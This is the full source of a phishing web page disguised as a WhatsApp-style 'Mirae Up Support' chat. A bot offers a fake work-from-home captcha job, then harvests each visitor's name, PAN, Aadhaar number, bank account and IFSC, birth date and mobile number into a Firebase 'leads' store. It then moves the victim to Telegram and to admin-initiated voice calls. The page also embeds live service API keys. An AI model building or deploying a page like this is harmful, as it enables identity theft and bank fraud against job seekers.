<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Mirae Up Support</title>
    <link rel="manifest" href="manifest.json">
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-messaging-compat.js"></script>
    <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
    <script src="https://download.agora.io/sdk/release/AgoraRTC_N.js"></script>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', sans-serif; }
        html, body { height: 100dvh; width: 100%; overflow: hidden; background:#dadbd3; }
        .container { width:100%; max-width:500px; height: 100dvh; background:#e5ddd5; display:flex; flex-direction:column; margin: 0 auto; position: relative; }
        .header { background:#075e54; color:white; padding:10px 15px; display:flex; align-items:center; gap:12px; height: 60px; z-index: 100; }
        .header img { width:40px; height:40px; border-radius:50%; background:#fff; }
        .chat-box { flex:1; padding:15px; overflow-y:auto; display:flex; flex-direction:column; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-size: cover; padding-bottom: 20px; }
        .msg { max-width:85%; padding:10px 14px; margin-bottom:12px; border-radius:10px; font-size:15px; line-height:1.5; position:relative; box-shadow: 0 1px 2px rgba(0,0,0,0.1); word-wrap: break-word; display:flex; flex-direction:column; background: white; }
        .received { align-self: flex-start; border-top-left-radius:0; }
        .sent { background:#dcf8c6; align-self: flex-end; border-top-right-radius:0; }
        .time { font-size: 10px; color: #888; align-self: flex-end; margin-top: 4px; }
        .msg img, .msg video { max-width: 100%; border-radius: 8px; margin-top: 5px; }
        .blue-link { color: #0088cc !important; font-weight: bold; text-decoration: underline; word-break: break-all; }
        .input-wrapper { background:#f0f0f0; padding:8px 10px; display:flex; align-items:center; gap:8px; min-height: 65px; border-top:1px solid #ddd; padding-bottom: env(safe-area-inset-bottom); }
        .input-container { flex:1; background: white; border-radius: 25px; display: flex; align-items: center; padding: 2px 15px; box-shadow: 0 1px 1px rgba(0,0,0,0.1); }
        .input-container input { flex:1; border:none; outline:none; padding:12px 5px; font-size:16px; background: transparent; width: 100%; }
        button#sendBtn { background:#075e54; color:white; border:none; width:48px; height:48px; border-radius:50%; cursor:pointer; display:flex; align-items:center; justify-content:center; flex-shrink: 0; }
        button#sendBtn svg { width: 24px; height: 24px; fill: white; margin-left: 3px; }
        .btn-row { display:none; gap:10px; justify-content:center; padding:15px; background:rgba(255,255,255,0.9); flex-wrap: wrap; border-top: 1px solid #ddd; position: absolute; bottom: 65px; width: 100%; z-index: 100; }
        .opt-btn { background:#075e54; color:white; border:none; padding:10px 20px; border-radius:25px; cursor:pointer; font-weight:bold; }
        #callUI { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(7, 94, 84, 0.98); z-index:2000; display:none; flex-direction:column; align-items:center; justify-content:center; color:white; }
        .action-card { background: white; padding: 12px; border-radius: 12px; margin-bottom: 12px; align-self: center; width: 90%; text-align: center; border: 1px solid #ddd; }
        .action-btn { display: block; background: #0088cc; color: white !important; padding: 12px; border-radius: 8px; text-decoration: none; font-weight: bold; text-align: center; margin: 10px 0; width: 100%; border:none; cursor:pointer; font-size: 14px; }
    </style>
</head>
<body>
<audio id="waSound" src="https://assets.mixkit.co/active_storage/sfx/2357/2357-preview.mp3" preload="auto"></audio>
<audio id="waRing" src="https://assets.mixkit.co/active_storage/sfx/1359/1359-preview.mp3" loop preload="auto"></audio>
<div id="callUI">
    <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" width="100" style="border-radius:50%; border:3px solid white; margin-bottom:20px;">
    <h2 id="callStatus">Support Calling...</h2>
    <div style="display:flex; margin-top:50px; gap:30px;"><button id="ansBtn" style="background:#25d366;width:70px;height:70px;border-radius:50%;border:none;color:white;font-size:24px;">📞</button><button onclick="hangUpLocal()" style="background:#ff3b30;width:70px;height:70px;border-radius:50%;border:none;color:white;font-size:24px;">📵</button></div>
</div>
<div class="container">
    <div class="header"><img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png"><div><div style="font-weight:bold; font-size: 16px;">Mirae Up Support</div><div id="status" style="font-size:12px; color:#cfd8dc;">Online</div></div></div>
    <div class="chat-box" id="chatBox"></div>
    <div id="buttonArea" class="btn-row"></div>
    <div class="input-wrapper">
        <div class="input-container">
            <label for="fileInp" style="cursor:pointer; font-size:22px; margin-right:10px">📎</label>
            <input type="file" id="fileInp" style="display:none" onchange="uploadToCloud(this)">
            <input type="text" id="userInput" placeholder="Type a message..." autocomplete="off">
        </div>
        <button id="sendBtn"><svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M2,21L23,12L2,3V10L17,12L2,14V21Z" /></svg></button>
    </div>
</div>
<script>
const firebaseConfig = { apiKey: "AIzaSyDw439IXSmTpustCkIQpRQ7foZ-hc8XiDQ", authDomain: "workhatapp.firebaseapp.com", databaseURL: "https://workhatapp-default-rtdb.asia-southeast1.firebasedatabase.app", projectId: "workhatapp", storageBucket: "workhatapp.appspot.com", messagingSenderId: "971559169599", appId: "1:971559169599:web:082be923ea9782440e128a" };
firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const AGORA_ID = "c0d5847270c04ed6b0bb4295ab2390b9", userId = localStorage.getItem('chat_uid') || 'USR' + Math.floor(Math.random()*999999);
localStorage.setItem('chat_uid', userId);

window.OneSignalDeferred = window.OneSignalDeferred || [];
OneSignalDeferred.push(async function(OneSignal) {
    await OneSignal.init({ appId: "c029d484-4048-4dfd-b88f-b6080f1cbb84" });
    OneSignal.setExternalUserId(userId);
});

const botSteps = [
    { key: "welcome", type: "auto", msg: "Welcome 🤗 To Ang Mirae Up Work From Home" },
    { key: "details", type: "auto", msg: "<b>Work Details 👇</b><br><b>Typing & Captcha And Form Fill Work</b><br><b>Daily Payout ₹1000-2000/Day</b><br>Without Investment! No Any Target<br>5Rs Per Captcha{200captcha/Day)<br><br><b>Eligibility 👇 Must Have 3 🆔</b><br>1:-Pan Card Number<br>2:-Adhar Link With Mobile 📱<br>3:- Bank For Salary<br><br>Interested Fill Form&Chat With Us 👇" },
    { key: "fullName", type: "input", msg: "Please Enter Your Full Name" },
    { key: "pan", type: "input", msg: "Enter Your PAN Card Number (ABCDE1234F)", pattern: /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/i },
    { key: "aadhar", type: "input", msg: "Enter 12-digit Aadhar Number", pattern: /^[0-9]{12}$/ },
    { key: "bankAcc", type: "input", msg: "Enter Your Bank Account Number" },
    { key: "ifsc", type: "input", msg: "Enter Bank IFSC Code" },
    { key: "dob", type: "date", msg: "Select Your Date of Birth" },
    { key: "gender", type: "button", msg: "Select Your Gender", options: ["Male", "Female"] },
    { key: "mobile", type: "input", msg: "Enter Mobile Number (10 digits)", pattern: /^[6-9][0-9]{9}$/ },
    { key: "state", type: "input", msg: "Enter Your State" },
    { key: "telegram", type: "button", msg: "Do You Have Telegram App?", options: ["Yes", "No"] }
];

let currentIdx = 0, isBotActive = true, agoraClient, localTrack, isBusy = false;
const chatBox = document.getElementById('chatBox'), userInput = document.getElementById('userInput'), buttonArea = document.getElementById('buttonArea'), statusText = document.getElementById('status'), waSound = document.getElementById('waSound'), waRing = document.getElementById('waRing');

function getTime() { const d = new Date(); return d.getHours().toString().padStart(2,'0') + ":" + d.getMinutes().toString().padStart(2,'0'); }

function parseText(text) {
    if (text.includes("<a") || text.includes("<button")) return text;
    return text.replace(/(https?:\/\/[^\s]+)/g, '<a href="$1" target="_blank" class="blue-link">Click Here</a>');
}

function appendMsg(m, type, isHtml = false) {
    const d = document.createElement('div'); d.className = `msg ${type}`;
    if(m.message && m.message.includes("res.cloudinary.com")) d.innerHTML = m.message.match(/\.(mp4|webm)$/i) ? `<video controls style="width:100%"><source src="${m.message}"></video>` : `<img src="${m.message}" onclick="window.open('${m.message}')">`;
    else d.innerHTML = isHtml ? m.message : parseText(m.message);
    d.innerHTML += `<span class="time">${getTime()}</span>`;
    chatBox.appendChild(d); chatBox.scrollTop = chatBox.scrollHeight;
}

window.onload = async () => {
    if ('serviceWorker' in navigator) navigator.serviceWorker.register('sw.js');
    db.ref('status/' + userId).set('online');
    db.ref('status/' + userId).onDisconnect().set('offline');
    const chatSnap = await db.ref('chats/' + userId).once('value');
    if(chatSnap.exists()) chatSnap.forEach(c => appendMsg(c.val(), c.val().sender === "Admin" ? "received" : "sent", true));
    const leadSnap = await db.ref('leads/' + userId).once('value');
    const userData = leadSnap.val() || {};
    if(userData.telegram) isBotActive = false;
    else {
        let count = 0;
        for(let s of botSteps) { if(s.key && userData[s.key]) count++; else if(s.type!=="auto") break; }
        currentIdx = (count > 0) ? count + 2 : 0; runBot();
    }
    db.ref('chats/' + userId).on('child_added', snap => {
        const m = snap.val();
        if(m.sender === "Admin") {
            if(m.type === "call") { document.getElementById('callUI').style.display='flex'; waRing.play(); }
            else if(m.type === "endcall") { hangUpLocal(); }
            else {
                let last = chatBox.lastElementChild;
                if(!last || !last.innerHTML.includes(m.message)) { appendMsg(m, "received"); waSound.play().catch(()=>{}); }
            }
        }
    });
};

function runBot() {
    if(currentIdx >= botSteps.length || !isBotActive || isBusy) return;
    const step = botSteps[currentIdx];
    statusText.innerText = "typing...";
    setTimeout(() => {
        appendMsg({message: step.msg}, "received", true); statusText.innerText = "Online";
        if(step.type === "auto") { currentIdx++; runBot(); } else setupUI(step);
    }, 600);
}

function setupUI(step) {
    buttonArea.style.display = step.type === "button" ? "flex" : "none";
    if(step.type === "button") {
        buttonArea.innerHTML = "";
        step.options.forEach(opt => {
            const btn = document.createElement('button'); btn.className="opt-btn"; btn.innerText=opt;
            btn.onclick = () => { buttonArea.style.display="none"; handleInput(opt); };
            buttonArea.appendChild(btn);
        });
    }
    if(step.type === "date") {
        userInput.type = "date";
        userInput.onchange = () => { if(userInput.value) handleInput(userInput.value); };
    } else { userInput.type = "text"; }
}

async function handleInput(val) {
    const step = botSteps[currentIdx];
    if(step && step.pattern && !step.pattern.test(val.toUpperCase())) return appendMsg({message: "❌ Invalid Format!"}, "received");
    isBusy = true; appendMsg({message: val}, "sent"); userInput.value = "";
    if(step && step.key) {
        await db.ref('leads/' + userId).update({ [step.key]: val, uid: userId });
        await db.ref('chats/' + userId).push({ sender: "User", message: val });
        if(step.key === "telegram") {
            isBotActive = false;
            appendMsg({message: "Form Submitted! Chat with agent."}, "received");
            appendMsg({message: `<a href="https://t.me/workfortyping" target="_blank" class="action-btn" style="background:#0088cc">TELEGRAM</a><button onclick="OneSignal.showNativePrompt()" class="action-btn" style="background:#e91e63">INSTALL APP</button>`}, "received");
        }
    }
    currentIdx++; isBusy = false; runBot();
}

document.getElementById('sendBtn').onclick = () => {
    const v = userInput.value.trim();
    if(!v || isBusy) return;
    if(isBotActive && currentIdx < botSteps.length && botSteps[currentIdx].type === "input") handleInput(v);
    else { appendMsg({message:v}, "sent", false); db.ref('chats/' + userId).push({ sender: "User", message: v }); }
    userInput.value = "";
};

async function uploadToCloud(input) {
    const file = input.files[0]; if(!file) return;
    appendMsg({message: "⏳ Uploading..."}, "sent");
    const formData = new FormData();
    formData.append('file', file); formData.append('upload_preset', 'mirae_preset');
    const res = await fetch(`https://api.cloudinary.com/v1_1/dqw0atvkp/upload`, {method:'POST', body:formData});
    const data = await res.json();
    await db.ref('chats/' + userId).push({ sender: "User", message: data.secure_url, type: (file.type.startsWith('video') ? 'video' : 'image') });
}

document.getElementById('ansBtn').onclick = async () => {
    waRing.pause();
    agoraClient = AgoraRTC.createClient({ mode: "rtc", codec: "vp8" });
    await agoraClient.join(AGORA_ID, "mirae_" + userId, null);
    localTrack = await AgoraRTC.createMicrophoneAudioTrack({ AEC: true, ANS: true });
    await agoraClient.publish([localTrack]);
    agoraClient.on("user-published", async (u, mt) => { await agoraClient.subscribe(u, mt); if (mt === "audio") u.audioTrack.play(); });
};

function hangUpLocal() {
    if(localTrack) { localTrack.stop(); localTrack.close(); }
    if(agoraClient) agoraClient.leave();
    db.ref('chats/' + userId).push({ sender: "User", type: "endcall", message: "Ended" });
    document.getElementById('callUI').style.display='none';
    waRing.pause();
}

let deferredPrompt;
window.addEventListener('beforeinstallprompt', (e) => { e.preventDefault(); deferredPrompt = e; });
</script>
</body>
</html>
